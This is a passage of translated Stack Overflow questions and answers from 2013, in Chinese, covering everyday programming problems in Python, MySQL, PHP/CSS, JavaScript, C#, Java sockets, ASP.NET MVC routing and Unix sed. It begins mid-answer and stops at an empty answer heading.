> 
> 时间：2013-03-24T20:40:22.710

在 HTML 中

```
{{#if isList}}
   {{> listTemplate}}
{{/if}}

{{#if isDetail}}
   {{> detailTemplate}}
{{/if}} 
```

在客户端的 javascript 中

```
Template.isList = function() {
   return Session.get("state") || Session.get("state") == "list"; 
}

Template.isDetail = function() {
   return Session.get("state") && Session.get("state") == "detail";
}

Template.listTemplate.events({
   "click #clickedRow" : function( event ) {
      Session.set("state", "detail")
   }
});

Template.detailTemplate.events({
   "click #backButton" : function( event ) {
      Session.set("state", "list")
   }
}); 
```

因为 Meteor 会在更改时重新渲染您的页面`state`，因此单击项目将具有更改页面的效果。

# python - Pythonic 有条件地分配变量的方法

> ID：15510673
> 
> 赞同：3
> 
> 时间：2013-03-19T21:21:34.860
> 
> 标签：python

关于如何在 Python 中做到这一点的任何建议？

```
if x():
  a = 20
  b = 10
else:
  a = 10
  b = 20 
```

我可以按如下方式交换它们，但不是很清楚（也不是非常pythonic IMO）

```
a = 10
b = 20
if x():
  [a, b] = [b, a] 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-19T21:22:40.120

```
(a,b) = (20,10) if x() else (10,20) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-19T21:23:09.963

在 Python 中交换值`a, b = b, a`被认为是[惯用的](http://python.net/~goodger/projects/pycon/2007/idiomatic/handout.html#swap-values)。

```
a, b = 10, 20
if x(): a, b = b, a 
```

一件好事是你不要重复`10`and `20`，所以它有点[DRY-er](http://en.wikipedia.org/wiki/Don%27t_repeat_yourself)。

# mysql - 在三个表之一中具有限制的内部连接语句

> ID：15510678
> 
> 赞同：2
> 
> 时间：2013-03-19T21:22:11.463
> 
> 标签：mysql, sql, inner-join, sql-limit

我试图从三个表（照片、相册、相册_照片）中获取数据，然后程序在相册表中搜索用户的相册，然后在相册_照片中查找每个相册的照片 ID，然后，对于每个 ID，按 ID 查看照片表中的所有数据。

昨天我问了这样的问题：[Inner join with 3 tables](https://stackoverflow.com/questions/15492646/inner-join-with-3-tables)，但现在，我认为问题不同了，我想知道如何为请求添加限制 by `inner join`。

所以，我现在正在使用这段代码：

```
SELECT a.album_name, a.album_id, c.* 
FROM albums a
INNER JOIN album_photos b ON a.album_id = b.album_id
INNER JOIN photos c ON b.photo_id = c.photo_id
WHERE (
  SELECT COUNT(*) 
  FROM album_photos d
  WHERE b.album_id = d.album_id
  AND d.nick =  :nick
) <=5 
```

好的，此代码选择包含 5 张或更少照片的相册。我不希望代码那样做，无论相册有多少张照片，我都想用 LIMIT OF 5 张照片显示相册。

其他人告诉我你做不到，我相信不是这样，因为SQL语言非常复杂，我认为我们应该有工具来做。

有没有办法以适当的方式做到这一点？

*在我上面分享的链接中，我举了一个关于输出数据的例子。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:26:53.320

尝试将`where`子句更改为：

```
WHERE (
  SELECT COUNT(*) 
  FROM album_photos d
  WHERE d.album_id = b.album_id and
        d.photo_id <= b.photo_id
  AND d.nick =  :nick
) <= 5 
```

这会按顺序计算照片的数量，而不仅仅是相册中的照片数量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:46:44.983

由于album_photos 有photo 和albums 之间的映射关系，你可以使用TOP 指定加入的照片数量：

```
SELECT a.album_name, a.album_id, p.* 
FROM albums a
INNER JOIN album_photos ap ON 
   ap.photo_id = (select top 5 photo_id from album_photos where a.album_id = ap.album_id order by photo_id)
INNER JOIN photos p ON ap.photo_id = p.photo_id 
```

子查询中的 Order by photo_id 将确保返回相同的 5 张（或更少）照片

编辑每条评论。修改为使用 MySql LIMIT 而不是 T-SQL TOP

```
SELECT a.album_name, a.album_id, p.* 
FROM albums a
INNER JOIN album_photos ap ON 
   ap.photo_id = (select photo_id from album_photos where a.album_id = ap.album_id order by photo_id LIMIT 0, 5)
INNER JOIN photos p ON ap.photo_id = p.photo_id 
```

# forms - 在输入多个输入时提交

> ID：15510680
> 
> 赞同：2
> 
> 时间：2013-03-19T21:22:17.803
> 
> 标签：forms

我有一个输入字段，在按 Enter 时提交，如下所示：

```
<form action="" method="POST" >
  <input type="text" name="name"/>
  <input type="submit" style="display:none;" />
</form> 
```

但是当我添加另一个字段时，按 enter 不会做任何事情：

```
<form action="" method="POST" >
  <input type="text" name="name"/>
  <input type="text" name="message"/>
  <input type="submit" style="display:none;" />
</form> 
```

为什么不？如何解决？

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T02:46:44.590

我不会使用显示：无。我认为您想要可见性：隐藏。

无论如何，我都不会使用。如果您不想要提交按钮，我会先将那些 / 在输入名称之后向右移动一个空格，然后使用 SO 上建议的 hack。

```
<form action="index.php" method="POST" >
   <input type="text" name="name" />
   <input type="text" name="message" />
   <input type="submit" style="position: absolute; left: -9999px; 
   width: 1px; height: 1px;"/>
</form> 
```

另外，请查看这个问题，因为它有一些很棒的答案。 [通过不带提交按钮按 Enter 提交表单](https://stackoverflow.com/questions/477691/submitting-a-form-by-pressing-enter-without-a-submit-button)

# php - CSS/PHP - 为每个 PHP 字符串使用不同的 CSS

> ID：15510681
> 
> 赞同：0
> 
> 时间：2013-03-19T21:22:22.757
> 
> 标签：php, html, css

我不久前发布了我的原始问题，回到这里：

[CSS/PHP - 用 Hover 和 If 语句覆盖图像](https://stackoverflow.com/questions/15317114/css-php-overlaying-an-image-with-hover-and-if-statements)

从那时起，我已经解决了我的主要问题，现在还剩下一个。返回服务器的代码如下所示：

```
<?php 
  foreach($servers as $server): 

  $stats = \Minecraft\Stats::retrieve(new \Minecraft\Server($server)); 
?>
<center>
  <pre>
    <div class="server">
      <div class="overlay"></div>
      <div class="<?php echo($stats->is_online) ? 'online' : 'offline'; ?>"></div>
      <div class="numbers"><?php printf('%u/%u', $stats->online_players, $stats->max_players); ?></div>         
    </div>
  </pre>
</center> 
```

如您所见，所有这些服务器都属于一个 CSS“服务器”类。这造成了问题，因为我需要返回的每台服务器都有不同的图像。

这是服务器类的 CSS：

```
.server {
    background: url('img/servers/hg.png') center no-repeat;
    width:  330px;
    height: 280px;
    overflow: hidden;
    position: relative;
 }
.server:hover { 
    background: url('img/servers/hg-hover.png') center no-repeat;
 } 
```

如何选择单个服务器，或列出要执行的 CSS？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:42:14.687

如果要为每个服务器添加特定的 css，可以添加一个额外的类：

```
<div class="server background_image_class_<?php echo $server->ID; ?>">
                                                    ^^^^^^^^^^^^ some variable that uniquely identifies the server. 
```

如果您将图像存储在与服务器信息相同的数据库中，您还可以使用内联 css：

```
<div class="server" style="background-image: url(<?php echo $server->backgroundImage; ?>);"> 
```

**编辑：**您可以从服务器 url 中删除所有非单词字符并将其用作类名：

```
<div class="server <?php echo  preg_replace("/[^\w]/", "", $server); ?>"> 
```

现在您可以在您的 css 中使用修改后的服务器名称：

```
.server {
  // general styles
  background-repeat: no-repeat;
  // etc.
}
.hg1playminezoneco {
  // image background form this specific server
  background-image: url(/path/to/hg1playminezoneco.png);
}
.hg1playminezoneco:hover {
  // image background form this specific server on hover
  background-image: url(/path/to/hg1playminezoneco-hover.png);
}
.pvpplayminezoneco {
  background-image: url(/path/to/pvpplayminezoneco.png);
}
.pvpplayminezoneco:hover {
  background-image: url(/path/to/pvpplayminezoneco-hover.png);
}
// etc. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:33:18.510

```
.server:nth-child(1) {
    background: url('img/servers/hg1.png') center no-repeat;
}
.server:nth-child(2) {
    background: url('img/servers/hg2.png') center no-repeat;
}
.server:nth-child(3) {
    background: url('img/servers/hg3.png') center no-repeat;
}
... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:27:03.630

从服务器类中删除图像特定的 CSS，例如背景。将特定的 CSS 分配给图像的 ID。

# javascript - 如何使用 javascript 更新房间 url 的计时器？

> ID：15510682
> 
> 赞同：-1
> 
> 时间：2013-03-19T21:22:25.197
> 
> 标签：javascript, mysql, node.js, redis

我要问的是概念问题，而不是编程问题。

例如说我有这个 url，一个房间叫做`lovelyroom`

[http://example.com/room/thelovelyroom](http://example.com/room/thelovelyroom)

每个房间都有一个以秒为单位的计时器，我们称之为`T`每秒不断更新。

每个通过该 url 进入（请求）房间的用户都需要获取值 (T + 2)

问题：

> 我可以在哪里存储每个可用房间的计时器 T？

我正在考虑使用 mysql，但这将是矫枉过正，尤其是我每秒都在更新时间字段。

另一种选择是使用redis，我听说它对这类东西很有用，快速的短期数据。

我真的只是想要什么是最好的方法，没有太多的开销。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:32:14.283

时间T什么时候开始？是从用户第一次查看页面开始的吗？

如果是这样，为什么不存储第一次访问的时间戳，然后对于后续的页面请求，再次获取时间戳并减去两者以计算经过的秒数。这样你就不需要每秒更新时间字段——只需要对请求做任何事情。

我会为此使用mysql。基本上只是一个带有 url、用户和时间戳的表。

当然，我可能没看懂你的问题……

# map - 如何设置 OpenLayers 地图的范围？

> ID：15510690
> 
> 赞同：4
> 
> 时间：2013-03-19T21:22:44.590
> 
> 标签：map, zooming, openlayers, bounds, pan

我想平移和缩放`OpenLayers.Map`到给定的`OpenLayer.Bounds`.

执行此操作的快速方法是什么？

我想查看地图边界内的所有内容。

干杯!

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-19T22:00:40.973

请尝试[OpenLayers.Map.zoomToExtent(OpenLayers.Bounds)](http://dev.openlayers.org/docs/files/OpenLayers/Map-js.html#OpenLayers.Map.zoomToExtent)它将缩放到传入的边界并重新定位地图。

# c# - 以 C# 的形式将文本框中的信息显示到列表框中

> ID：15510692
> 
> 赞同：1
> 
> 时间：2013-03-19T21:22:54.680
> 
> 标签：c#, string, forms, listbox

我制作了以下表格，但在成员数量列表框中显示成员数量时遇到问题，这是按下按钮“添加艺术家”之前的屏幕截图

![在此处输入图像描述](../Images/1d405394b35a35dbec193afef702371a.png)

这是当我按下添加艺术家时发生的事情，你可以看到它使用艺术家名称的内容而不是艺术家数量

![在此处输入图像描述](../Images/5d990a95990d6d4385d8ae2855c60520.png)

这是我的form1代码：

```
 public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();
    }

    Dictionary<String, Book> music = new Dictionary<String, Book>();

    private void btnAdd_Click(object sender, EventArgs e)
    {
        if ((txtIsbn.Text != "") & (txtArtist.Text != "")) // if text artist name and number of artists is present
        {
            try { music.Add(txtArtist.Text, new Book(txtArtist.Text, txtIsbn.Text)); } //txtArtist
            catch { MessageBox.Show("Already Exist!!"); }
        }
        else MessageBox.Show("Please fill in both Artist Name and Number of Members");

        listBox1.Items.Clear();
        listBox2.Items.Clear();
        listBox3.Items.Clear();
        foreach (var pair in music)
        {
            listBox1.Items.Add(pair.Key);
            //listBox2.Items.Add(pair.Value.Onloan);
            listBox3.Items.Add(pair.Key);
        }
    } 
```

这是我的 Artist 类的代码（称为 book，因为我编辑了我之前创建的程序）：

```
class Book
{
    private String mem; //mem = number of members
    private string artist;

    public Book(string mem, string artist)
    {
        this.mem = mem;
        this.artist = artist;
    }

    public string MEM
    {
        get { return mem; }
        set { mem = value; }
    }

    public string Artist
    {
        get { return artist; }
        set { artist = value; }
    } 
```

我已经意识到它正在从“Key”命令中添加艺术家姓名的值：listBox3.Items.Add(pair.Key);

但是我不知道将其更改为..任何帮助都非常感谢:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:28:17.603

在你的

```
 foreach (var pair in music)
    {
        listBox1.Items.Add(pair.Key);
        //listBox2.Items.Add(pair.Value.Onloan);
        Book b = pair.Value;
        listBox3.Items.Add(b.MEM);
    } 
```

您不会将 MEM 属性的内容添加到列表框中。但我也没有看到你设置它的任何地方。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:29:10.650

很难确定，但似乎您希望在 foreach 循环中这样做：

```
listBox3.Items.Add(pair.Value.MEM); 
```

此外，由于`mem`您的构造函数中的参数是第一个，您可能想要交换您传入的内容，以便它对齐：

```
new Book(txtIsbn.Text, txtArtist.Text) 
```

这是假设`txtArtist.Text`包含您想要的值`Artist`，并且`txtIsbn.Text`包含您想要的值`MEM`。

作为旁注，清理名称是值得的，这将使以后更容易发现问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:32:06.623

代替：

```
foreach (var pair in music)
        {
            listBox1.Items.Add(pair.Key);
            //listBox2.Items.Add(pair.Value.Onloan);
            listBox3.Items.Add(pair.Key);
        } 
```

我想你想要：

```
foreach (var pair in music)
        {
            listBox1.Items.Add(pair.Key);
            //listBox2.Items.Add(pair.Value.Onloan);
            listBox3.Items.Add(pair.Value.MEM );
        } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-19T21:33:20.617

您的音乐词典包含按艺术家姓名排列的书籍。
所以key是书名，value是书名。
正确的做法是：

```
foreach (var pair in music)
{
    var book = pair.Value;
    listBox1.Items.Add(book.Artist);
    listBox3.Items.Add(book.MEM);
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-19T21:34:42.843

无需捕获异常，只需检查 book 是否已添加到字典中。还将书籍设置为列表框的数据源，而不是手动将它们添加到项目中：

```
private void btnAdd_Click(object sender, EventArgs e)
{
    if (txtIsbn.Text == "" || txtArtist.Text == "")
    {
       MessageBox.Show("Please fill in both Artist Name and Number of Members");
       return;
    }

    Book book = new Book(txtArtist.Text, txtIsbn.Text);

    if (music.ContainsKey(book.Artist))
    {
        MessageBox.Show("Already Exist!!");
        return;
    }

    music.Add(book.Artist, book);
    var books = music.Values.ToList();   

    listBox1.DisplayMember = "Artist"; // set it in designer
    listBox1.DataSource = books;
    listBox3.DisplayMember = "MEM"; // set it in designer
    listBox3.DataSource = books;
} 
```

# java - 套接字 mac os x 与 windows java 慢

> ID：15510696
> 
> 赞同：2
> 
> 时间：2013-03-19T21:23:12.420
> 
> 标签：java, windows, performance, osx-lion, osx-mountain-lion

请帮我弄清楚为什么 Mac OS X Java 比 Windows XP Java 花费的时间长 5 倍。

我有一些在 Mac 和 PC Java 上表现不同的代码。我有一个 Java GUI，可以与 Windows XP 机器上的许多“服务器”通信。

当我在另一台 Windows XP 机器或 linux 机器上运行 GUI 时，LabView 会收到消息并在 1 秒内做出响应。

当它从 Mac OS X 机器上运行时，需要 5 秒。暂停似乎是（从我们可以告诉调试的所有内容）我认为我发送字符串“pot 7\r\n”和 LabView 实际接收到它的时间之间。

当来自 Windows 时，LabView 会立即看到 pot 7 命令（我们有一个显示要检查），但根据 LabView 程序员的说法，该命令直到从 Mac OS 机器发送的 5 秒过去后才会显示在屏幕上。

我会尝试在这里提供足够的代码，让知道更多的人可能会说啊哈！

```
String IPaddress;
int commPort;
BufferedReader reader;
PrintWriter writer;
Socket sock;
long timeout = 8000; 
```

...

```
public synchronized void connectCommPort() {
    if (commportconnected != true) {
        try {
            sock = new Socket();
            InetSocketAddress endpoint = new InetSocketAddress(IPaddress, commPort);
            sock.connect(endpoint, timeout);
            sock.setSoTimeout( timeout );
            reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));
            writer = new PrintWriter(sock.getOutputStream());
            commportconnected = true;
            errorstatus = false;
        } catch (IOException ex) {
            logwriter("LabV: WARNING - network connection to Labview command port failed."+ex.toString());
            commportconnected = false;
            errorstatus = true;
        }
    }
} 
```

...

```
public synchronized float[] readpots() {

    String message = "pot 7";
    connectCommPort();

    if (commportconnected) {
        try {
            writer.print(message + "\r\n");
            writer.flush();
            logwriter("LabV: [sent] " + message);

            shortpotvalues = potslistener();
        } catch (Exception ex) {
        }
        disconnectCommPort();
    }
    potvalues[0] = shortpotvalues[0];
    potvalues[1] = shortpotvalues[1];
    potvalues[2] = shortpotvalues[2];
    potvalues[3] = shortpotvalues[3];
    potvalues[4] = shortpotvalues[4];
    potvalues[5] = shortpotvalues[5];
    potvalues[6] = shortpotvalues[6];
    potvalues[7] = 5.0f;

    return potvalues;
}

public synchronized float[] potslistener() {

    String message = null;
    int i = 0;
    try {
        //while ((message = reader.readLine()) != null && i < shortpotvalues.length) {
        while (i < shortpotvalues.length) {
            message = reader.readLine();
            if ( message != null )
            {
                logwriter("LabV: [received] " + message);
                if (message.contains(".")) 
                {
                    shortpotvalues[i] = Float.parseFloat(message);
                    i++;
                }
            }
            else
            {
                logwriter("LabV: received NULL unexpectedly, may not have all pots correct");
            }
        }  // close reader-ready-while
    } catch (ArrayIndexOutOfBoundsException aiofbex) {
        logwriter("LabV: in potslistener() Array out of bounds! " + aiofbex.toString());
    } catch (Exception ex) {
        logwriter("LabV: in potslistener() got exception: " + ex.toString());
    }
    return shortpotvalues;
} 
```

在 Mac OS X 10.8 上。运行 java -version 给出：

```
marks-Mac-mini:~ mark$ java -version
java version "1.6.0_43"
Java(TM) SE Runtime Environment (build 1.6.0_43-b01-447-11M4203)
Java HotSpot(TM) 64-Bit Server VM (build 20.14-b01-447, mixed mode) 
```

在 Windows XP 上（当 GUI 在 Windows 上运行并且工作正常时使用的 java）给出：

```
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\gus>java -version
java version "1.7.0_07"
Java(TM) SE Runtime Environment (build 1.7.0_07-b10)
Java HotSpot(TM) Client VM (build 23.3-b01, mixed mode, sharing) 
```

最后，这是来自 PC 的部分日志：

```
2013-03-19T11:45:22.000 LabV: [sent] pot 7
2013-03-19T11:45:22.921 LabV: [received] 2.310835
2013-03-19T11:45:22.921 LabV: [received] 2.447397 
```

并且相应地来自 Mac（注意发送和第一次接收之间的 5 秒）：

```
2013-03-13T12:13:17.092 LabV: [sent] pot 7
2013-03-13T12:13:22.513 LabV: [received] 2.300508
2013-03-13T12:13:22.514 LabV: [received] 2.112090 
```

提前感谢您的任何帮助/建议。

跟进：

我后来发现，如果我使用具有相同 Java 的 10.7.5 Mac OS 机器，速度与 Windows XP 相同。我现在正在调查 10.8.3 和网络和/或安全防火墙设置的问题。再次感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-05T21:09:46.833

Maye 这将帮助其他人。

当在一个隔离的网络上运行时，这个问题就成了一个障碍。在完成所有这些工作（模拟器、输出流、禁用 bonjour 等）之后，解决方案是在 Microsoft Windows XP 机器上编辑主机文件。

我认为这很有效，因为没有时间花在寻找 WINS 或 DNS 服务器上。令人讨厌的是，在同一网络上的 mac 或 linux 机器上，寻址 IP 地址会自动消除任何导致超时的 DNS 调用。编辑文件完全消除了奇怪的延迟。当我再次可以访问机器时，我会更具体地说明编辑的内容。

导致我们出现此问题的调试是注意到一些需要很长时间才能响应的 netbios 请求。他们看到这个的时候我不在。我的理解是他们在 mac os 机器上运行了一个数据包嗅探器并看到了这些请求。当他们编辑 Windows 机器主机文件时，问题就消失了（它可以找到没有 netbios 广播的 mac）。

> “经过一些数据包嗅探后，我们确定我们在从 GUI 查询安捷伦时遇到的延迟是由于 [Windows XP 机器] 一直在通过 WINS 服务寻找安捷伦 [电机控制器] 造成的。可以并不是说我完全理解发生了什么，但我们验证了当我们关闭 NetBIOS 服务时延迟消失了。
> 
> 这一切都很好，除了 Windows 文件共享似乎依赖于 NetBIOS 服务，因此没有它我们无法访问 [Windows XP 机器] 上的磁盘。
> 
> 所以我们在主机文件中添加了两行“

那是我同事发给我的。所以它与我的 java 代码相距两个系统......我在 Windows XP 机器上处理了一个 LabView 应用程序。我为 LabView 应用程序编写了一个模拟器。但网络问题出在 LabView 应用程序和另一台设备之间。所以他的解决方案是在 Windows\System32\Drivers\etc\hosts 中放两行来解决 Windows 端的 Mac 和 Agilent 并且网络延迟消失了！

# asp.net-mvc-4 - 在 WebAPI 中重用 MVC4 组件

> ID：15510697
> 
> 赞同：1
> 
> 时间：2013-03-19T21:23:12.633
> 
> 标签：asp.net-mvc-4, asp.net-web-api, adapter, code-reuse

我在一个拥有大量自定义模型绑定器、价值提供者等的 MVC4 站点上进行了大量投资。

我现在想向站点添加一些 WebAPI 控制器并重用一些 MVC4 组件。看起来 MVC 和 WebAPI 中有许多并行的概念（例如模型绑定），但是基类和接口存在于不同的命名空间中，这意味着类型是不可互换的。

是否有一种既定的模式可以使 MVC 类适应它们的 WebAPI 等价物？具体来说，我对能够将 a`System.Web.Mvc.IModelBinder`作为 `System.Web.Http.ModelBinding.IModelBinder`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-24T13:21:11.330

问题不在于接口，而是两个模型绑定器使用的模型绑定规则完全不同，并且基于不同的概念。这就是接口在两个不同的命名空间中定义的原因，否则它们将使用完全相同的接口。两个接口之间存在并行性，但它们代表两个不同的概念。换句话说，语法相似但语义不同，因此您不能在它们之间进行一对一的映射

# ios - iOS UICollectionView 选择

> ID：15510700
> 
> 赞同：0
> 
> 时间：2013-03-19T21:23:17.043
> 
> 标签：ios, selection, uicollectionview

我的问题很简单。是否可以将选择单元格的手势更改为双击而不是默认手势？如果是这样，这样做的一般方法是什么？

提前致谢。

正则表达式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:27:05.130

您可以使用[手势识别](http://developer.apple.com/library/ios/#documentation/EventHandling/Conceptual/EventHandlingiPhoneOS/GestureRecognizer_basics/GestureRecognizer_basics.html%23//apple_ref/doc/uid/TP40009541-CH2-SW2)器来捕获手势事件。

我从未在主界面中看到过它；我担心苹果会拒绝它，因为它不符合[HIG](http://developer.apple.com/library/ios/#documentation/UserExperience/Conceptual/MobileHIG/Introduction/Introduction.html)。

# javascript - 基于单元格值的颜色行

> ID：15510708
> 
> 赞同：1
> 
> 时间：2013-03-19T21:24:00.140
> 
> 标签：javascript

我有一个包含特定列的表，其中单元格仅包含“R”、“N”或“Y”。我想根据提到的这些值中的任何一个为行着色。任何意见将是有益的

这是我所拥有的，但它没有改变行颜色

```
 var rows = document.getElementById("trans_separate").getElementsByTagName("tbody")
  [0].getElementsByTagName("tr");

    // loops through each row
    for (i = 0; i < rows.length; i++) {cells = rows[i].getElementsByTagName('td');

            if (cells[14].innerText == R)
                rows[i].className = "red";

            else if (cells[14].innerText == Y)
                rows[i].className = "Yellow";

            else if (cells[1].innerText == N)
                null

 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:46:31.353

在 Ubuntu 上的 Firefox 中工作：[jsfiddle](http://jsfiddle.net/TKWB5/1)

ps 应该是`else-if`. 如果里面的文本是`'R'`，那么你不应该评估`'Y'`。

```
var rows = document.getElementById("trans_separate").getElementsByTagName("tbody")[0].getElementsByTagName("tr");

for (i = 0; i < rows.length; i++) {
    row = rows[i].getElementsByTagName('td');
    var cell = getText(row[0]);
    if (cell === 'R') rows[i].className = "red";
    else if (cell === 'Y') rows[i].className = "yellow";
}

function getText(cell) {
    return (cell.innerText == undefined) ? cell.textContent : cell.innerText;
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-19T21:33:27.370

工作示例：

```
var rows = document.getElementById("trans_separate").getElementsByTagName("tbody")
  [0].getElementsByTagName("tr");

    // loops through each row
    for (i = 0; i < rows.length; i++) {cells = rows[i].getElementsByTagName('td');

            if (cells[0].innerHTML == 'R')
                rows[i].className = "red";

            if (cells[0].innerHTML == 'Y')
                rows[i].className = "yellow";           
 } 
```

[http://jsfiddle.net/mMFwQ/4/](http://jsfiddle.net/mMFwQ/4/)

# javascript - 带有下划线js的数组中对象值的小写

> ID：15510712
> 
> 赞同：1
> 
> 时间：2013-03-19T21:24:20.827
> 
> 标签：javascript, underscore.js

假设我在数据变量中有这个 JSON 数据

```
[{"id":"1","module_id":"1","title":"Test",
  "start_date":"2012-11-12" "end_date":"2012-11-18"},
 {"id":"8","module_id":"1","title":"This is OK",
  "start_date":"2013-01-14","end_date":"2013-01-31"}] 
```

如何使用 underscore.js 获得以下结果？

```
[{"id":"1","module_id":"1","title":"test",
  "start_date":"2012-11-12","end_date":"2012-11-18"},
 {"id":"8","module_id":"1","title":"this is ok",
  "start_date":"2013-01-14","end_date":"2013-01-31"}] 
```

我可以用调用来做到这一点吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-12-02T19:17:19.327

您可以使用[Lo Dash 的`_.mapValues`功能](https://lodash.com/docs#mapValues)轻松完成此操作：

```
_.mapValues(objs, function(s){
  return _.isString(s) ? s.toLowerCase() : s;
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T22:31:05.283

如果您已经在处理一个对象（或解析的 JSON），您可以循环并创建一个新对象：

```
var objs = [{"id":"1","module_id":"1","title":"Test", "start_date":"2012-11-12", "end_date":"2012-11-18"},{"id":"8","module_id":"1","title":"This is OK", "start_date":"2013-01-14","end_date":"2013-01-31"}];

var out = [];
for(var i=0; i<objs.length; i++) {
    var outObj = {}
    for(var prop in objs[i]) {
        var val = objs[i][prop];
        if(prop === 'title') {
            val = val.toLowerCase();  
        }
        outObj[prop] = val;
    }
    out.push(outObj);
}
console.log(out); 
```

[http://jsfiddle.net/uY36J/](http://jsfiddle.net/uY36J/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T22:41:15.397

如果你有`array`对象：

```
for(var i = 0; i < array.length; i++) {
   for (var prop in array[i])
       // condition here
       array[i][prop] = array[i][prop].toLowerCase();
}

console.log(array) 
```

与下划线相同（我不认为它更短 - 你在这里仍然需要两个循环。更具可读性 - 也许，但不会更短）

```
_.each(array, function(obj) {
    _.each(obj, function(value, key) { 
        // condition here        
        obj[key] = value.toLowerCase();
    });
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-02T15:39:30.743

您可以将对象分隔为两个数组，一个带有键，另一个带有值，然后使用 _.map 将字符串小写。

```
var objs = [{"id":"1","module_id":"1","title":"Test", "start_date":"2012-11-12", "end_date":"2012-11-18"},{"id":"8","module_id":"1","title":"This is OK", "start_date":"2013-01-14","end_date":"2013-01-31"}];

 _.map(objs,function(element) {
     return  _.object(_.keys(element), _.values(element).map(function(value) { 
         return _.isString(value)? value.toLowerCase():value; 
     }));
 }); 
```

你看，我正在检查它是否是我们正在处理的字符串，以避免在其他类型上调用 toLowerCase。

小写键和值也很简单

```
 _.map(objs,function(element) {
     return  _.object(
         _.keys(element).map(function(key) { 
             return _.isString(key)? key.toLowerCase():key; 
         }),
         _.values(element).map(function(value) { 
             return _.isString(value)? value.toLowerCase():value; 
         })
     );
 }); 
```

警告：这不会对嵌套对象进行操作。¯\_(ツ)_/¯

# delphi - 64 位 delphi 应用程序中的 {$SetPEFlags IMAGE_FILE_LARGE_ADDRESS_AWARE}

> ID：15510715
> 
> 赞同：3
> 
> 时间：2013-03-19T21:24:34.130
> 
> 标签：delphi, compiler-construction, 64-bit

`{$SetPEFlags IMAGE_FILE_LARGE_ADDRESS_AWARE}`对 64 位 delphi 应用程序有影响吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:31:49.487

它根本没有效果。所有 64 位进程都被自动规定为大地址感知。

# unix - 在 UNIX 上更改文件中的一行

> ID：15510716
> 
> 赞同：0
> 
> 时间：2013-03-19T21:24:37.657
> 
> 标签：unix

我在基于 UNIX 的系统上创建了一个名为“asd.txt”的文件。

我使用 echo 命令添加了四行。

现在，我想更改此文件的第一行。

我不允许使用任何文本编辑器，例如 vi。

我必须只使用命令行来做到这一点。任何人都可以帮忙吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:38:32.410

这是使用 sed 执行此操作的方法。

```
sed '1 s/search/replace/' asd.txt 
```

如果您愿意并拥有 GNU sed，请使用`-i`开关来完成它。

如果你想替换整个第一行怎么做？

```
echo "Here is my new first line" && sed '1d' asd.txt 
```

对于这两个命令，您可以使用`>`运算符将​​输出重定向到新文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:32:13.657

```
#!/bin/bash
cat <(echo "Replacement") <(tail -n +2 foo.txt) 
```

# asp.net-mvc - 错误的 MVC 路由匹配。ASP.NET

> ID：15510717
> 
> 赞同：0
> 
> 时间：2013-03-19T21:24:38.487
> 
> 标签：asp.net-mvc, asp.net-mvc-routing

这是我的路线注册码：

```
 routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

        routes.MapRoute(
            "course_list",
            "course/list",
            new { controller = "course", action = "list" }
        );

        routes.MapRoute(
            "course_view",
            "course/view/{id}",
            new { controller = "course", action = "list", id = UrlParameter.Optional }
        );

        routes.MapRoute(
            name: "Default",
            url: "{controller}/{action}/{id}",
            defaults: new { controller = "Home", action = "Index", id = UrlParameter.Optional }
        ); 
```

* * *

我有一个链接 /course/view/87

匹配的路由是/course/list

谁能解释为什么？

谢谢

更新：

routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

```
 routes.MapRoute(
            "course_list",
            "course/list",
            new { controller = "course", action = "list" }
        );

        routes.MapRoute(
            "course_view",
            "course/view/{id}",
            new { controller = "course", action = "view", id = UrlParameter.Optional }
        );

        routes.MapRoute(
            name: "Default",
            url: "{controller}/{action}/{id}",
            defaults: new { controller = "Home", action = "Index", id = UrlParameter.Optional }
        ); 
```

但我仍然遇到同样的问题。当我访问：/course/view/87 时，我收到 404 错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:34:46.943

It appears that your route for course/view/{Id} has a 'list' action. I expect this is a typo.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:41:16.290

将这些路由添加到一个空的 Asp.Net Mvc 4 项目并使用 routedebugger ( [http://nuget.org/packages/routedebugger/](http://nuget.org/packages/routedebugger/) )，我得到一个“course/view/{id}”的匹配路由。您应该在本地使用 routedebugger 来查看发生了什么。上面的代码似乎没问题。

* * *

## 回答 #3

